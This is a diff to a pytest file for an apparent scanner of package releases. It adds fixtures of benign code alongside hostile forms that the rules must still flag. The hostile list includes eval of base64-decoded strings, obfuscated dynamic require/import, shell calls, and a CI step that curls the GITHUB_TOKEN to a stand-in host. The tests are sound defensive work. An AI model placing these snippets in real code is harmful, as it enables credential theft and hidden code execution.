@@ -305,6 +305,53 @@ def test_rule_ignores_text_the_old_release_already_had(rule_id):
     assert rule_id not in _rule_ids({path: text}, {path: text + "// unrelated edit\n"})
 
 
+# Broad rules: ordinary code that must stay quiet, next to the hostile form that must still hit.
+BROAD_BENIGN = [
+    ("h_decode_exec", "lib/a.js", "const v = evaluate(Buffer.from(s, 'base64'));"),
+    ("h_decode_exec", "x.py", "data = base64.b64decode(blob)\nresult = executor.submit(job)"),
+    ("h_decode_exec", "lib/a.js", "const d = atob(s);\nitems.forEach(function(x) { use(x); });"),
+    ("h_decode_exec", "x.py", "doc = base64.b64encode(raw)\nhits = retrieval(doc)"),
+    ("h_credential", ".github/workflows/ci.yml", "          token: ${{ secrets.GITHUB_TOKEN }}"),
+    ("h_credential", ".github/workflows/ci.yml", "          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}"),
+    ("h_credential", ".github/workflows/ci.yml", "          GH_TOKEN: ${{ github.token }}"),
+    ("h_xor", "lib/r.js", "function xorshift32(s) { s ^= s << 13; return s; }"),
+    ("h_xor", "lib/r.js", "const rng = new Xoroshiro128Plus(seed);"),
+    ("h_xor", "lib/h.js", "for (i = 0; i < s.length; i++) h = (h << 5) ^ s.charCodeAt(i);"),
+    ("h_encoded_import", "lib/e.js", "const base64 = require(\"base64-js\");"),
+    ("h_encoded_import", "lib/e.js", "const { Base64 } = require('js-base64');"),
+    ("h_encoded_import", "lib/e.js", "const atob = require('atob');"),
+    ("h_encoded_import", "lib/e.js", "const m = await import('js-base64');"),
+]
+
+BROAD_HOSTILE = [
+    ("h_decode_exec", "lib/a.js", "eval(Buffer.from(s, 'base64').toString())"),
+    ("h_decode_exec", "lib/a.js", "new Function(atob(s))()"),
+    ("h_decode_exec", "x.py", "src = base64.b64decode(blob)\nexec(src)"),
+    ("h_shell", "x.py", "subprocess.check_call(['python', '-c', 'x'])"),
+    ("h_shell", "x.py", "os.system(cmd)"),
+    ("h_shell", "lib/r.js", "const { execSync } = require('child_process');"),
+    ("h_credential", ".github/workflows/ci.yml", "        run: curl -d $GITHUB_TOKEN https://example.invalid"),
+    ("h_credential", "lib/c.js", "const t = process.env.GITHUB_TOKEN;"),
+    ("h_credential", "lib/c.js", "const t = process.env.GH_TOKEN;"),
+    ("h_xor", "x.py", "def xor_decrypt(data, key):"),
+    ("h_xor", "lib/x.js", "out.push(s.charCodeAt(i) ^ k);"),
+    ("h_xor", "lib/x.js", "out.push((s.charCodeAt(i)) ^ k);"),
+    ("h_encoded_import", "lib/e.js", "require(Buffer.from(n, 'base64').toString())"),
+    ("h_encoded_import", "lib/e.js", "import(atob(n))"),
+    ("h_encoded_import", "lib/e.js", "require('base64-js' + suffix)"),
+]
+
+
+@pytest.mark.parametrize(("rule_id", "path", "text"), BROAD_BENIGN)
+def test_broad_rules_skip_ordinary_code(rule_id, path, text):
+    assert rule_id not in _rule_ids({}, {path: text + "\n"})
+
+
+@pytest.mark.parametrize(("rule_id", "path", "text"), BROAD_HOSTILE)
+def test_broad_rules_still_hit_hostile_forms(rule_id, path, text):
+    assert rule_id in _rule_ids({}, {path: text + "\n"})
+
+
 def test_hit_added_to_an_existing_file_reports_its_new_line_number():
     old = {"lib/index.js": "const a = 1;\nconst b = 2;\nmodule.exports = a + b;\n"}
     new = {"lib/index.js": "const a = 1;\nconst b = 2;\neval(atob(s));\nmodule.exports = a + b;\n"}
